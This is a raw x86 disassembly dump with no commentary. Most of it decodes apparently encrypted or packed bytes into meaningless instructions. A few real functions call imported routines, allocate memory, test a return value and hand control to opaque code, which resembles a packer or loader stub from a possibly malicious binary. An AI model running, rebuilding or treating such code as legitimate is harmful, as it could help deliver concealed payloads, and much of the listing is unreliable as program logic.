  422a17:	xchg   esp,eax
  422a18:	scas   eax,DWORD PTR es:[edi]
  422a19:	pop    ebx
  422a1a:	push   edi
  422a1b:	adc    BYTE PTR [ebx],ah
  422a1d:	jnp    0x422a9e
  422a1f:	inc    edi
  422a20:	dec    esi
  422a21:	(bad)  
  422a22:	fcom   QWORD PTR [edx+0x2a]
  422a25:	cmp    edi,esp
  422a27:	punpckhwd mm7,QWORD PTR [ecx-0x74]
  422a2b:	mov    esp,0x4264d4f6
  422a30:	outs   dx,BYTE PTR ds:[esi]
  422a31:	(bad)  
  422a32:	stos   BYTE PTR es:[edi],al
  422a33:	pop    edx
  422a34:	ror    DWORD PTR [esi],0xe5
  422a37:	ins    DWORD PTR es:[edi],dx
  422a38:	add    eax,DWORD PTR [edi-0xa]
  422a3b:	cmp    edx,DWORD PTR ds:0x3de882c2
  422a41:	out    dx,eax
  422a42:	test   BYTE PTR [ecx+0x66],bh
  422a45:	scas   eax,DWORD PTR es:[edi]
  422a46:	cdq    
  422a47:	jmp    0x4c94:0x56c0aa73
  422a4e:	(bad)
  422a51:	jmp    0x9f4a2198
  422a56:	pushf  
  422a57:	int    0x55
  422a59:	mov    edi,0x1804f437
  422a5e:	out    dx,eax
  422a5f:	xor    al,0x34
  422a61:	loope  0x422a2c
  422a63:	scas   eax,DWORD PTR es:[edi]
  422a64:	test   DWORD PTR [ecx],0x65d27c88
  422a6a:	es data16 rcl bl,cl
  422a6e:	xchg   edx,edi
  422a70:	jnp    0x422a84
  422a72:	std    
  422a73:	leave  
  422a74:	sbb    eax,0x7d8c6950
  422a79:	mov    esi,0x99924386
  422a7e:	(bad)
  422a81:	in     eax,0xe0
  422a83:	lock (bad) 
  422a85:	jns    0x422a3a
  422a87:	test   BYTE PTR [eax-0x3],0xaf
  422a8b:	sbb    BYTE PTR [eax],ch
  422a8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a8e:	sahf   
  422a8f:	outs   dx,BYTE PTR ds:[esi]
  422a90:	cwde   
  422a91:	pop    eax
  422a92:	xlat   BYTE PTR ds:[ebx]
  422a93:	mov    cl,0x9f
  422a95:	xor    DWORD PTR ds:0x9a8c140e,ebp
  422a9b:	or     BYTE PTR [ecx+edi*8],ch
  422a9e:	rcl    BYTE PTR [ebx],cl
  422aa0:	mov    al,0x4e
  422aa2:	mov    dh,0xee
  422aa4:	add    esp,DWORD PTR [esi]
  422aa6:	sub    BYTE PTR [edx],ch
  422aa8:	jne    0x422b08
  422aaa:	cmp    BYTE PTR [esi+0x22350bf3],ah
  422ab0:	mov    cl,0xe7
  422ab2:	cmp    BYTE PTR [ebx+0xf],0x7f
  422ab6:	out    0x40,al
  422ab8:	push   ebp
  422ab9:	shr    DWORD PTR [edx+esi*4],1
  422abc:	lahf   
  422abd:	js     0x422a8c
  422abf:	and    DWORD PTR [esi],0x379ee0db
  422ac5:	jae    0x422a56
  422ac7:	jb     0x422b48
  422ac9:	cld    
  422aca:	cmp    BYTE PTR [esp+edi*4+0x62],cl
  422ace:	sahf   
  422acf:	sub    esi,DWORD PTR [ebx]
  422ad1:	fbld   TBYTE PTR [esi-0x4c]
  422ad4:	fwait
  422ad5:	adc    al,ch
  422ad7:	retf   
  422ad8:	xchg   ebx,eax
  422ad9:	fdivr  QWORD PTR ds:0x9a3d3e20
  422ae0:	les    ebp,FWORD PTR [edx+0x22668800]
  422ae6:	retf   0x2b72
  422ae9:	push   ds
  422aea:	clc    
  422aeb:	push   eax
  422aec:	jo     0x422af2
  422aee:	fnstsw WORD PTR [ebp-0x3569464f]
  422af4:	mov    esp,0x782e7081
  422af9:	jmp    0x273:0x811ed054
  422b00:	fnstcw WORD PTR ds:0x1ec3b297
  422b06:	add    al,0xb5
  422b08:	js     0x422b62
  422b0a:	xlat   BYTE PTR ds:[ebx]
  422b0b:	add    BYTE PTR [eax-0x58],ch
  422b0e:	sar    BYTE PTR [ebp-0x35],cl
  422b11:	cmp    DWORD PTR [eax],edi
  422b13:	in     eax,0x3f
  422b15:	jmp    0x422b28
  422b17:	and    al,0x5d
  422b19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b1b:	outs   dx,BYTE PTR ds:[esi]
  422b1c:	jmp    DWORD PTR [ebx+0x0]
  422b1f:	inc    esp
  422b20:	jmp    0x422b3a
  422b22:	shl    DWORD PTR fs:[ebx+0x0],0xe9
  422b27:	mov    al,ds:0xcead0425
  422b2c:	call   0xa604:0x5b618b5c
  422b33:	sub    eax,edx
  422b35:	clc    
  422b36:	(bad)  [edx]
  422b38:	pop    es
  422b39:	jbe    0x422b30
  422b3b:	and    ecx,ebx
  422b3d:	dec    ecx
  422b3e:	in     eax,dx
  422b3f:	sbb    al,0xbe
  422b41:	add    ecx,DWORD PTR [eax-0x52270404]
  422b47:	popa   
  422b48:	pop    edi
  422b49:	les    edx,FWORD PTR [edi+0xf768c5d]
  422b4f:	in     al,dx
  422b50:	mov    edx,0x1e745674
  422b55:	pop    ebp
  422b56:	ins    BYTE PTR es:[edi],dx
  422b57:	fistp  WORD PTR ds:0x8f6f65b1
  422b5d:	repnz mov ss,WORD PTR [edx-0x2b]
  422b61:	inc    ebx
  422b62:	fiadd  WORD PTR [edi]
  422b64:	call   0xc806f93
  422b69:	or     eax,0x5d1feb8b
  422b6e:	sti    
  422b6f:	loope  0x422bda
  422b71:	popa   
  422b72:	or     eax,0x7c8a49a0
  422b77:	icebp  
  422b78:	sbb    ch,BYTE PTR ds:0x3fb039a6
  422b7e:	ret    0x108f
  422b81:	repz enter 0x9fd2,0x29
  422b86:	mov    BYTE PTR [ecx-0x7ca26d5a],al
  422b8c:	or     BYTE PTR [eax+0x37e64cec],bh
  422b92:	jg     0x422b78
  422b94:	in     eax,0x43
  422b96:	xor    eax,0xa0bf31a2
  422b9b:	fld    DWORD PTR [ebx-0x1401a20f]
  422ba1:	sar    BYTE PTR [ecx+0x67],0xb
  422ba5:	scas   eax,DWORD PTR es:[edi]
  422ba6:	adc    eax,0x9ff84a50
  422bab:	pop    ebp
  422bac:	jo     0x422b97
  422bae:	stc    
  422baf:	lea    edx,[esi]
  422bb1:	nop
  422bb2:	retf   
  422bb3:	mov    ebx,0xe5d04256
  422bb8:	pusha  
  422bb9:	adc    DWORD PTR [edx+0x6e],edi
  422bbc:	xchg   esi,eax
  422bbd:	jmp    0x9b8d8b5f
  422bc2:	sub    al,0x59
  422bc4:	in     al,0x95
  422bc6:	leave  
  422bc7:	mov    ds:0xfe35074c,eax
  422bcc:	enter  0xdd2e,0xe4
  422bd0:	cmc    
  422bd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422bd2:	(bad)  
  422bd3:	les    ecx,FWORD PTR [edx-0x66]
  422bd6:	jnp    0x422b77
  422bd8:	pop    es
  422bd9:	outs   dx,DWORD PTR ds:[esi]
  422bda:	test   DWORD PTR [edi+0x22],0xbdc4963a
  422be1:	cwde   
  422be2:	jne    0x422bb9
  422be4:	pop    ecx
  422be5:	mov    BYTE PTR [edx],ah
  422be7:	(bad)  
  422be8:	out    dx,al
  422be9:	push   ebp
  422bea:	ror    BYTE PTR [ecx+0x37],0x20
  422bee:	ja     0x422bf3
  422bf0:	push   esp
  422bf1:	stc    
  422bf2:	and    al,0xfe
  422bf4:	cmp    al,0x11
  422bf6:	(bad)  
  422bf7:	div    BYTE PTR [eax+0x3d]
  422bfa:	cmp    al,0x4a
  422bfc:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  422bfe:	mov    ecx,0x1663d196
  422c03:	and    BYTE PTR [edx+0x3e],0xb7
  422c07:	mov    edi,0xf2ecd1d7
  422c0c:	mov    ecx,cs
  422c0e:	(bad)  
  422c0f:	pop    esp
  422c10:	aas    
  422c11:	ja     0x422c4e
  422c13:	in     al,0x34
  422c15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c16:	mov    bl,0x99
  422c18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c19:	or     al,0x12
  422c1b:	ins    BYTE PTR es:[edi],dx
  422c1c:	mov    fs,WORD PTR [esi+ebx*8-0xa]
  422c20:	push   ss
  422c21:	mov    dh,0xda
  422c23:	popf   
  422c24:	scas   ax,WORD PTR es:[edi]
  422c26:	(bad)  
  422c27:	jbe    0x422c64
  422c29:	cmp    BYTE PTR [eax-0x56700b92],cl
  422c2f:	push   es
  422c30:	and    eax,DWORD PTR [ebx+0xc58dbb7]
  422c36:	(bad)  
  422c37:	mov    cl,0x1d
  422c39:	mov    esp,DWORD PTR [eax]
  422c3b:	lods   al,BYTE PTR ds:[esi]
  422c3c:	out    0x9d,al
  422c3e:	into   
  422c3f:	dec    esp
  422c40:	lods   al,BYTE PTR ds:[esi]
  422c41:	sub    BYTE PTR [esp+ecx*8-0x708f4df4],dl
  422c48:	jne    0x422c89
  422c4a:	adc    eax,ecx
  422c4c:	jae    0x422c95
  422c4e:	jle    0x422c86
  422c50:	sbb    DWORD PTR [edi-0x16],edi
  422c53:	mov    ah,BYTE PTR [edx+0x53]
  422c56:	xor    BYTE PTR [ecx+edx*1],bl
  422c59:	imul   BYTE PTR [ebp-0x80]
  422c5c:	mov    eax,ds:0x8c30f69b
  422c61:	ss push cs
  422c63:	cmp    eax,0x32ba02b1
  422c68:	push   ss
  422c69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422c6a:	bound  eax,QWORD PTR [edx-0x42]
  422c6d:	inc    ebx
  422c6e:	adc    ebx,0x2fa2076b
  422c74:	jnp    0x422c99
  422c76:	pusha  
  422c77:	pop    eax
  422c78:	cmc    
  422c79:	xor    BYTE PTR [eax],ch
  422c7b:	mov    al,ds:0x1a991415
  422c80:	mov    al,ds:0xae06dc20
  422c85:	xchg   BYTE PTR [esp+ebp*2-0x723f3b2b],dl
  422c8c:	jge    0x422c10
  422c8e:	mov    al,0x12
  422c90:	addr16 jmp 0x7c1c:0x97962826
  422c98:	fld    TBYTE PTR [ecx-0x24b65be2]
  422c9e:	mov    edi,0x22e21724
  422ca3:	add    al,0x4b
  422ca5:	scas   eax,DWORD PTR es:[edi]
  422ca6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ca7:	sbb    BYTE PTR [ecx+esi*4],dh
  422caa:	in     al,0x9
  422cac:	pop    esp
  422cad:	cmp    al,0xf6
  422caf:	lods   al,BYTE PTR ds:[esi]
  422cb0:	inc    ebp
  422cb1:	push   edx
  422cb2:	out    0x15,eax
  422cb4:	sti    
  422cb5:	mov    BYTE PTR [edi+esi*8],bl
  422cb8:	loopne 0x422d2a
  422cba:	repnz pushf 
  422cbc:	jp     0x422cb1
  422cbe:	scas   al,BYTE PTR es:[edi]
  422cbf:	(bad)  
  422cc0:	jmp    0xf2af:0xa2ba10f9
  422cc7:	jmp    0x2c93f87
  422ccc:	out    0xdb,al
  422cce:	rcr    BYTE PTR [esi],cl
  422cd0:	push   eax
  422cd1:	out    0xf1,eax
  422cd3:	inc    esp
  422cd4:	dec    edx
  422cd5:	repz cs icebp 
  422cd8:	push   0xfffffff4
  422cda:	mov    cl,0xf7
  422cdc:	inc    esp
  422cdd:	stos   DWORD PTR es:[edi],eax
  422cde:	xchg   ebx,eax
  422cdf:	cmp    eax,0x5e10aeaa
  422ce4:	in     eax,0x3c
  422ce6:	mov    ss,eax
  422ce8:	clc    
  422ce9:	xor    eax,0x4c44a707
  422cee:	les    ebx,FWORD PTR ds:0x91b2fb37
  422cf4:	imul   edx,eax,0xffffffbd
  422cf7:	rcl    BYTE PTR [esi+0x64],1
  422cfa:	mov    al,bh
  422cfc:	scas   eax,DWORD PTR es:[edi]
  422cfd:	push   esp
  422cfe:	out    0x88,al
  422d00:	bound  ebp,QWORD PTR [edx+eax*1]
  422d03:	sub    esi,eax
  422d05:	icebp  
  422d06:	jmp    FWORD PTR [ecx]
  422d08:	add    ebx,DWORD PTR [eax-0x7a]
  422d0b:	adc    BYTE PTR [edi-0x6a],ch
  422d0e:	sub    eax,0xb2aa7b99
  422d13:	test   al,0x61
  422d15:	jnp    0x422d07
  422d17:	ins    DWORD PTR es:[edi],dx
  422d18:	jp     0x422d68
  422d1a:	bound  ebp,QWORD PTR [eax-0x61]
  422d1d:	(bad)  
  422d1e:	arpl   WORD PTR [ebx-0x65f20d8],si
  422d24:	pop    es
  422d25:	adc    eax,0xc7a90a3f
  422d2a:	in     eax,0xce
  422d2c:	cwde   
  422d2d:	cs and al,0x31
  422d30:	pmulhw mm6,QWORD PTR [edx-0x1]
  422d34:	mov    edi,0xf0070452
  422d39:	xchg   DWORD PTR [edi+eiz*1+0xc],esi
  422d3d:	lods   al,BYTE PTR ds:[esi]
  422d3e:	daa    
  422d3f:	call   0xbad6bcdf
  422d44:	mov    bl,0x81
  422d46:	pop    esi
  422d47:	dec    edx
  422d48:	int3   
  422d49:	sbb    edx,DWORD PTR [ecx+0x36]
  422d4c:	stos   BYTE PTR es:[edi],al
  422d4d:	xor    eax,0xd8d5ab81
  422d52:	jno    0x422d16
  422d54:	mov    cl,0x77
  422d56:	pop    ebx
  422d57:	push   edx
  422d58:	ins    BYTE PTR es:[edi],dx
  422d59:	(bad)  
  422d5b:	push   esi
  422d5c:	adc    bh,dl
  422d5e:	mov    BYTE PTR [ebp+0x432fd85f],0xf9
  422d65:	loope  0x422dc0
  422d67:	mov    eax,ds:0x2414b1e7
  422d6c:	pop    ecx
  422d6d:	in     al,0x7
  422d6f:	sbb    edi,ebx
  422d71:	stos   BYTE PTR es:[edi],al
  422d72:	sti    
  422d73:	pop    ds
  422d74:	std    
  422d75:	xchg   esp,eax
  422d76:	sub    al,BYTE PTR [esi+0x7d]
  422d79:	idiv   ch
  422d7b:	inc    ebp
  422d7c:	(bad)  
  422d7d:	in     eax,0xa8
  422d7f:	xchg   ebp,eax
  422d80:	cld    
  422d81:	xor    al,0x10
  422d83:	adc    eax,0xf2b079ae
  422d88:	arpl   WORD PTR [edi+0x756743d],si
  422d8e:	sbb    bl,cl
  422d90:	pop    ss
  422d91:	jae    0x422dcc
  422d93:	dec    eax
  422d94:	sahf   
  422d95:	lds    ecx,FWORD PTR [edi+0x14]
  422d98:	mov    bh,0xa5
  422d9a:	and    bh,al
  422d9c:	sub    eax,0x6ad64418
  422da1:	add    eax,0xd85e3518
  422da6:	addr16 dec eax
  422da8:	dec    esi
  422da9:	jmp    0x9860:0x8d68f9e
  422db0:	sti    
  422db1:	or     DWORD PTR [edi+0xf],edi
  422db4:	imul   BYTE PTR [edx]
  422db6:	and    cl,BYTE PTR [ebx]
  422db8:	push   edi
  422db9:	loope  0x422dfc
  422dbb:	loope  0x422e16
  422dbd:	mov    BYTE PTR [ebx],cl
  422dbf:	inc    esi
  422dc0:	arpl   WORD PTR [edi],bp
  422dc2:	mov    al,ds:0xc9840f30
  422dc7:	cmp    dh,BYTE PTR [esp+ecx*2+0x2f0df210]
  422dce:	adc    BYTE PTR [eax+eax*2],ah
  422dd1:	push   eax
  422dd2:	cmp    dh,al
  422dd4:	fs jmp 0x422df9
  422dd7:	cli    
  422dd8:	xchg   ebx,eax
  422dd9:	and    DWORD PTR [esi-0x19],eax
  422ddc:	xchg   edx,eax
  422ddd:	xlat   BYTE PTR ds:[ebx]
  422dde:	out    dx,al
  422ddf:	push   es
  422de0:	add    al,0x8b
  422de3:	sub    DWORD PTR [ebp-0x1],ecx
  422de6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422de7:	das    
  422de8:	mov    al,0x59
  422dea:	daa    
  422deb:	fs fwait
  422ded:	mov    WORD PTR [ecx],gs
  422def:	and    esp,DWORD PTR [eax+ebx*1-0x51]
  422df3:	adc    bp,WORD PTR [ebx-0x16]
  422df7:	cmp    eax,DWORD PTR [ecx+0x49]
  422dfa:	mov    ch,0xdd
  422dfc:	ficomp DWORD PTR [ebp+0x7423a24f]
  422e03:	data16 ja 0x422e0a
  422e06:	jge    0x422e0a
  422e08:	shr    DWORD PTR [edi+0x485ec266],1
  422e0e:	mov    DWORD PTR [esi-0xd993b48],0x4ef7172d
  422e18:	loope  0x422dc6
  422e1a:	jo     0x422e35
  422e1c:	in     eax,dx
  422e1d:	push   eax
  422e1e:	jns    0x422e80
  422e20:	mov    al,0x3c
  422e22:	jb     0x422dd6
  422e24:	gs mov cl,0x83
  422e27:	add    al,0xad
  422e29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e2a:	mov    ds:0x3f38b10e,al
  422e2f:	pop    ebx
  422e30:	push   ds
  422e31:	jg     0x422dde
  422e33:	rol    DWORD PTR [ebx-0x64bf9bfe],0xd4
  422e3a:	mov    cl,0xc6
  422e3c:	pop    eax
  422e3d:	outs   dx,BYTE PTR ds:[esi]
  422e3e:	or     eax,0x727397ab
  422e43:	pop    esp
  422e44:	add    eax,0x93df97d7
  422e49:	or     BYTE PTR [edx+0x4a],cl
  422e4c:	cmp    BYTE PTR [eax-0x11957d6],bl
  422e52:	repnz das 
  422e54:	jbe    0x422e92
  422e56:	mov    dh,BYTE PTR [esi-0x557beefe]
  422e5c:	into   
  422e5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e5e:	push   cs
  422e5f:	clc    
  422e60:	lahf   
  422e61:	push   es
  422e62:	mov    bh,0xe0
  422e64:	scas   al,BYTE PTR es:[edi]
  422e65:	retf   0xbc80
  422e68:	pop    ebp
  422e69:	cmp    esp,DWORD PTR [ebx+0x66]
  422e6c:	fs push esi
  422e6e:	cs sbb al,0x89
  422e71:	scas   al,BYTE PTR es:[edi]
  422e72:	aam    0x94
  422e74:	loope  0x422e74
  422e76:	sbb    BYTE PTR [ebx-0x6554d4f0],bl
  422e7c:	push   ss
  422e7d:	std    
  422e7e:	into   
  422e7f:	leave  
  422e80:	fnstsw WORD PTR [esi+eiz*4-0x518048dc]
  422e87:	popa   
  422e88:	push   ecx
  422e89:	sti    
  422e8a:	sbb    BYTE PTR [esi],bl
  422e8c:	pop    ss
  422e8d:	(bad)  
  422e8e:	lods   al,BYTE PTR fs:[esi]
  422e90:	in     eax,dx
  422e91:	pushf  
  422e92:	pop    edx
  422e93:	mov    edx,0x268ef302
  422e98:	ror    BYTE PTR [ecx],0x35
  422e9b:	xchg   ebx,ecx
  422e9d:	sub    DWORD PTR ds:[ebx],ebp
  422ea0:	or     DWORD PTR ds:0x6e62c7e5,ebp
  422ea6:	in     eax,0xda
  422ea8:	jg     0x422ed9
  422eaa:	pop    eax
  422eab:	ins    DWORD PTR es:[edi],dx
  422eac:	clc    
  422ead:	stos   DWORD PTR es:[edi],eax
  422eae:	cld    
  422eaf:	imul   ebx,DWORD PTR [edi+0x672dcc3b],0x5ec9b772
  422eb9:	and    eax,0x6d1cedcf
  422ebe:	mov    ch,0x7c
  422ec0:	and    esi,edx
  422ec2:	jns    0x422e5b
  422ec4:	xlat   BYTE PTR ds:[ebx]
  422ec5:	aaa    
  422ec6:	loopne 0x422ed7
  422ec8:	mov    eax,ds:0x38852842
  422ecd:	scas   al,BYTE PTR es:[edi]
  422ece:	aaa    
  422ecf:	fnstenv [edx+0x3052c6af]
  422ed5:	adc    eax,0x36bcfe86
  422eda:	xlat   BYTE PTR ds:[ebx]
  422edb:	test   BYTE PTR [edi-0x3b],ah
  422ede:	mov    ebp,0x2d3145ee
  422ee3:	dec    ebp
  422ee4:	jno    0x422f05
  422ee6:	ffreep st(5)
  422ee8:	imul   ecx,DWORD PTR [edx+0x5a],0x68
  422eec:	out    0xe6,al
  422eee:	push   edi
  422eef:	into   
  422ef0:	popf   
  422ef1:	test   BYTE PTR [ecx+ebx*2-0x14b9146d],0xcc
  422ef9:	lock jno 0x422ee6
  422efc:	dec    BYTE PTR [eax+0x5c]
  422eff:	jno    0x422f3c
  422f01:	push   ecx
  422f02:	pop    esi
  422f03:	int    0x1f
  422f05:	retf   0x720c
  422f08:	xchg   edx,eax
  422f09:	or     bl,BYTE PTR [eax]
  422f0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f0c:	mov    cl,0x77
  422f0e:	xor    DWORD PTR [edx+0x4dc50ef7],esp
  422f14:	gs push edi
  422f16:	fbld   TBYTE PTR [esi-0x71]
  422f19:	popf   
  422f1a:	mov    dl,0x2a
  422f1c:	lock mov edx,0x6952e53c
  422f22:	sub    eax,0x7df9a6be
  422f27:	fidiv  WORD PTR [ebx+ecx*8]
  422f2a:	sbb    edx,ebx
  422f2c:	shl    al,1
  422f2e:	in     al,0xa2
  422f30:	jge    0x422f4f
  422f32:	or     BYTE PTR [edi],0xd1
  422f35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f36:	cmp    DWORD PTR [ebp-0x74a1d09b],esp
  422f3c:	arpl   WORD PTR [esi],cx
  422f3e:	dec    eax
  422f3f:	jbe    0x422f88
  422f41:	mov    DWORD PTR [edx+ecx*4],ebx
  422f44:	mov    dl,0xac
  422f46:	lods   al,BYTE PTR ds:[esi]
  422f47:	adc    cl,BYTE PTR [ecx+ebx*8+0x69]
  422f4b:	sbb    BYTE PTR [edx],bl
  422f4d:	mov    cl,0x27
  422f4f:	pop    edx
  422f50:	mov    al,BYTE PTR [esi]
  422f52:	lods   eax,DWORD PTR ds:[esi]
  422f53:	popa   
  422f54:	loopne 0x422f7a
  422f56:	sub    eax,0x4c9f10b1
  422f5b:	lock out dx,al
  422f5d:	add    edi,DWORD PTR [ecx-0x59]
  422f60:	and    DWORD PTR [edx],esp
  422f62:	mov    al,ds:0x8bd1c42f
  422f67:	outs   dx,BYTE PTR ds:[esi]
  422f68:	jo     0x422f21
  422f6a:	pop    ss
  422f6b:	ja     0x422f7b
  422f6d:	sbb    DWORD PTR [ecx],esi
  422f6f:	js     0x422f0e
  422f71:	clc    
  422f72:	mov    ch,0x5e
  422f74:	mov    eax,0x350c3df5
  422f79:	or     DWORD PTR [eax+0x1],edi
  422f7f:	mov    esp,ebp
  422f81:	pop    ebp
  422f82:	ret    
  422f83:	int3   
  422f84:	int3   
  422f85:	int3   
  422f86:	int3   
  422f87:	int3   
  422f88:	int3   
  422f89:	int3   
  422f8a:	int3   
  422f8b:	int3   
  422f8c:	int3   
  422f8d:	int3   
  422f8e:	int3   
  422f8f:	int3   
  422f90:	push   ebp
  422f91:	mov    ebp,esp
  422f93:	sub    esp,0x8
  422f96:	push   esi
  422f97:	push   0x0
  422f99:	mov    DWORD PTR [ebp-0x4],0x0
  422fa0:	call   DWORD PTR ds:0x42905c
  422fa6:	mov    esi,DWORD PTR ds:0x429030
  422fac:	push   0x4
  422fae:	push   0x1000
  422fb3:	push   0x4cf
  422fb8:	push   0x1000
  422fbd:	mov    DWORD PTR [ebp-0x8],esi
  422fc0:	call   DWORD PTR ds:0x429058
  422fc6:	test   esi,esi
  422fc8:	jne    0x422fd2
  422fca:	push   esi
  422fcb:	push   esi
  422fcc:	call   DWORD PTR ds:0x429014
  422fd2:	push   0xa
  422fd4:	push   0x0
  422fd6:	push   0x0
  422fd8:	call   DWORD PTR ds:0x429054
  422fde:	push   0x0
  422fe0:	push   0x4e
  422fe2:	push   0x1e
  422fe4:	push   0x0
  422fe6:	push   0xffffffff
  422fe8:	call   DWORD PTR ds:0x429088
  422fee:	test   eax,eax
  422ff0:	je     0x422ffa
  422ff2:	push   0x0
  422ff4:	call   DWORD PTR ds:0x42904c
  422ffa:	mov    esi,DWORD PTR [ebp-0x8]
  422ffd:	call   esi
  422fff:	mov    DWORD PTR [ebp-0x4],eax
  423002:	cmp    DWORD PTR [ebp-0x4],0x57
  423006:	jne    0x42301d
  423008:	push   0x6a4416e6
  42300d:	call   0x4111f0
  423012:	add    esp,0x4
  423015:	push   0x0
  423017:	call   DWORD PTR ds:0x429048
  42301d:	push   0x0
  42301f:	call   DWORD PTR ds:0x429044
  423025:	xor    eax,eax
  423027:	pop    esi
  423028:	mov    esp,ebp
  42302a:	pop    ebp
  42302b:	ret    
  42302c:	nop
  42302d:	nop
  42302e:	nop
  42302f:	nop
  423030:	sub    esp,0x10
  423033:	push   esi
  423034:	mov    esi,DWORD PTR ds:0x42915c
  42303a:	push   0x5
  42303c:	push   0x0
  42303e:	call   esi
  423040:	push   0x5
  423042:	push   0x0
  423044:	call   esi
  423046:	push   0x0
  423048:	push   0x0
  42304a:	push   0x0
  42304c:	call   DWORD PTR ds:0x429040
  423052:	lea    eax,[esp+0x4]
  423056:	push   eax
  423057:	call   DWORD PTR ds:0x429068
  42305d:	call   DWORD PTR ds:0x429064
  423063:	cmp    WORD PTR [esp+0x4],0x0
  423069:	pop    esi
  42306a:	push   0x0
  42306c:	je     0x42308f
  42306e:	push   0x0
  423070:	push   0x100000
  423075:	call   DWORD PTR ds:0x429060
  42307b:	push   0x0
  42307d:	call   0x422f90
  423082:	add    esp,0x4
  423085:	call   0x411000
  42308a:	jmp    0x4244c4
  42308f:	push   0x3d
  423091:	push   0x20
  423093:	call   0x4244f6
  423098:	push   DWORD PTR [esi-0x35b76ccf]
  42309e:	jbe    0x423106
  4230a0:	xchg   ebp,eax
  4230a1:	xor    al,0x3b
  4230a3:	rcr    edi,cl
  4230a5:	push   cs
  4230a6:	add    al,0x6b
  4230a8:	add    esi,eax
  4230aa:	leave  
  4230ab:	jbe    0x423113
  4230ad:	xchg   ebp,eax
  4230ae:	xor    BYTE PTR [ebx],bh
  4230b0:	rcr    DWORD PTR [edi+0x36bfbf1],cl
  4230b6:	dec    eax
  4230b7:	leave  
  4230b8:	jbe    0x423120
  4230ba:	xchg   ebp,eax
  4230bb:	xor    BYTE PTR [ebx],bh
  4230bd:	rcr    edi,cl
  4230bf:	icebp  
  4230c0:	sti    
  4230c1:	imul   eax,DWORD PTR [ebx],0x48
  4230c4:	leave  
  4230c5:	jbe    0x42312d
  4230c7:	xchg   ebp,eax
  4230c8:	xor    BYTE PTR [ebx],bh
  4230ca:	rcr    edi,cl
  4230cc:	icebp  
  4230cd:	sti    
  4230ce:	imul   eax,DWORD PTR [ebx],0x48
  4230d1:	leave  
  4230d2:	jbe    0x42313a
  4230d4:	xchg   ebp,eax
  4230d5:	enter  0xd33b,0xdf
  4230d9:	jmp    esp
  4230db:	ror    DWORD PTR ds:0xab7f7d48,1
  4230e1:	mov    ah,0x88
  4230e3:	cmp    bl,BYTE PTR [edi+0x3afd012]
  4230e9:	push   0x3b
  4230eb:	jmp    0x583c44f6
  4230f0:	dec    ecx
  4230f1:	mov    dl,0xb2
  4230f3:	rcr    DWORD PTR [eax-0x59d992f6],1
  4230f9:	add    al,BYTE PTR [esi-0x9]
  4230fc:	push   ebp
  4230fd:	sbb    esp,DWORD PTR [ecx+0x2db9faa]
  423103:	ins    DWORD PTR es:[edi],dx
  423104:	push   0xb535398d
  423109:	pop    ebp
  42310a:	push   esp
  42310b:	mov    bh,0xba
  42310d:	fcomip st,st(6)
  42310f:	or     WORD PTR [ecx+ecx*8+0x76],bp
  423114:	xchg   bp,ax
  423116:	xor    BYTE PTR [ebx],bh
  423118:	rcr    eax,cl
  42311a:	push   0xb0403207
  42311f:	pop    ebx
  423120:	jl     0x423147
  423122:	ins    DWORD PTR es:[edi],dx
  423123:	mov    ds:0x63279031,al
  423128:	icebp  
  423129:	xor    esp,DWORD PTR [esi+0x44]
  42312c:	ret    
  42312d:	sub    DWORD PTR [esi-0x499cc5f9],ebx
  423133:	out    0xfb,eax
  423135:	cmp    DWORD PTR [ebx+0x13914291],edx
  42313b:	pop    edi
  42313c:	lahf   
  42313d:	pop    eax
  42313e:	ret    
  42313f:	inc    ecx
  423140:	aad    0xdd
  423142:	jne    0x423196
  423144:	or     DWORD PTR [esi],ecx
  423146:	xor    esp,esp
  423148:	ins    BYTE PTR es:[edi],dx
  423149:	fbstp  TBYTE PTR [eax+0x995d92a]
  42314f:	imul   esp,DWORD PTR [ecx+0x49],0x3e7cc8c8
  423156:	ins    DWORD PTR es:[edi],dx
  423157:	mov    ds:0x62279031,al
  42315c:	icebp  
  42315d:	inc    ebx
  42315e:	cli    
  42315f:	fcmovb st,st(3)
  423161:	leave  
  423162:	mov    esi,0x2b763a15
  423167:	dec    ebp
  423168:	sti    
  423169:	mov    ds:0xc1423e0e,eax
  42316e:	mov    ?,esp
  423170:	lahf   
  423171:	push   0xb3d5db5e
  423176:	add    edi,ecx
  423178:	or     DWORD PTR [eax],edx
  42317a:	lods   al,BYTE PTR ds:[esi]
  42317b:	jns    0x4231e9
  42317d:	xlat   BYTE PTR ds:[ebx]
  42317e:	enter  0xd9a9,0x8d
  423182:	cwde   
  423183:	cwde   
  423184:	add    eax,DWORD PTR [eax-0x50]
  423187:	pop    ebx
  423188:	jl     0x4231f0
  42318a:	xchg   ebp,eax
  42318b:	xor    BYTE PTR [ebx],bh
  42318d:	rcr    edi,cl
  42318f:	icebp  
  423190:	sti    
  423191:	cmp    eax,DWORD PTR [esi+0x48]
  423194:	leave  
  423195:	cmp    ah,BYTE PTR [edi-0x69]
  423198:	xor    bh,dl
  42319a:	xor    BYTE PTR [eax+0x36bfbbe],al
  4231a0:	dec    eax
  4231a1:	leave  
  4231a2:	jbe    0x42320a
  4231a4:	xchg   ebp,eax
  4231a5:	sar    BYTE PTR [ebx],1
  4231a7:	rcr    dh,1
  4231a9:	cli    
  4231aa:	cli    
  4231ab:	popa   
  4231ac:	add    ecx,DWORD PTR [eax+0x25]
  4231af:	jb     0x423217
  4231b1:	xchg   ebp,eax
  4231b2:	xor    al,0x3d
  4231b4:	rcr    edi,cl
  4231b6:	icebp  
  4231b7:	sti    
  4231b8:	imul   eax,DWORD PTR [edx],0xfffffff5
  4231bb:	leave  
  4231bc:	jbe    0x423224
  4231be:	test   DWORD PTR [eax],esi
